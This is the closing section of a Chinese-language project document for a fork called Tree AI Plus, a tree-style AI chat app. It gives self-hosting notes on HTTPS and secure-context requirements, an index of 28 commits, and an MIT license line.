  ⚠️ 桌面壳的 origin 和浏览器不同，**IndexedDB 不会跟过去，API Key 要重填** ——
  迁移只能做一次，越晚定越贵

### 自持要点

⚠️ **必须用 HTTPS（或 `http://localhost`）。**
代码里有 9 处 `crypto.randomUUID()`，它**要求安全上下文**：

| 访问方式 | `crypto.randomUUID()` |
|---|---|
| `http://localhost:5175` | ✅ |
| `https://...` | ✅ |
| `http://192.168.x.x` | ❌ **新建会话 / 节点 / 模型全部失败** |
| `tauri://localhost`（桌面壳） | ❓ **待实测**（Pake 试手感的第一项，会一票否决） |

自持时用自签证书 / Caddy / Cloudflare Tunnel 都可以。IndexedDB 本身不要求安全上下文。

> `vite.config.ts` 里 `strictPort: false`，5175 被占用时端口会自动漂移，
> 请以终端实际输出为准（或改成 `true`）。

---

## 七、提交索引

按时间顺序（旧 → 新）。这就是 `git log --oneline upstream/master..master` 的全部 28 个提交：

```
2bd25d3  fix(vite): 删掉 optimizeDeps.exclude lucide-react（修空白页）
2f0503e  feat: 支持 DeepSeek V4 推理模型 + 思考链
87bd0b6  feat: 暗色模式、每条回答的统计、UI 修复
3f9d2a5  fix: 暗色可读性、Ctrl+滚轮缩放、节点加宽、DeepSeek 默认值
c752bbc  feat: 思考链实时流、会话自动命名、输入文字可读性
bcc03ef  feat: JSON 备份与恢复（会话 + 模型）
c942155  fix: 静默失败、默认模型、切模型时的系统提示词
773ad36  chore: 清零全部第三方 CDN 请求，改用系统字体
4a229ee  fix: 新节点落在看得见的地方
88ba7a0  feat: 从任意 OpenAI 兼容服务商收集 token 用量
f1598a9  chore: 提交 bun.lock
c777394  fix: 新节点放进空位，并让视口跟随
b1625ae  fix: 保住 React Flow 的节点测量值（修连线不显示 / 流式闪屏）
78fc17d  chore: 重命名为 Tree AI Plus
01d91c1  docs: 加上 PLUS.md
826a1fb  fix: 流式输出时光标不再抖动
d9ee4c7  feat: 新节点的输入框自动取得焦点
e063480  docs: 把光标 / 焦点两处修法补进 PLUS.md
7856956  docs: 交接两个未解缺陷，附根因（HANDOFF.md）
697d749  feat: 文件夹 + 设置中心，修画布连线 / 焦点 / 编辑 UX
6ee2678  fix: 堵上 markdown XSS；修「重新排布」丢节点位置
07f036a  feat: i18n、每会话视口、节点悬浮操作 + 一批 UX 修复
1dbffcd  style: 把节点「+」飘到右下、侧边栏底部并成一行
206ca86  style: 「+」回到底部中央，复制/重试飘右下
e7ffc2c  style: 设置/主题上移到标题行，重做应用标识
fe882a6  fix: 悬浮按钮与提问复制按钮统一（治好暗色白药丸）
4f83227  fix: 首次进入居中，视口跳刷新持久化
902531e  feat: 新人友好的默认值与逐档思考强度说明，修空画板
```

> 说明：
> - `1dbffcd` 和 `206ca86` 是一对「试错 + 回退」，保留在历史里比 squash 掉
>   更能说清「为什么最终是底部中央」。
> - `e063480` / `7856956` 之后文档就到顶了，后面 9 个提交都没进文档 ——
>   正好就是本文这次补上的（第二节、第四节、第五节）。

---

## License

与上游一致（MIT）。原始项目版权归 [Anionex](https://github.com/Anionex) 所有。
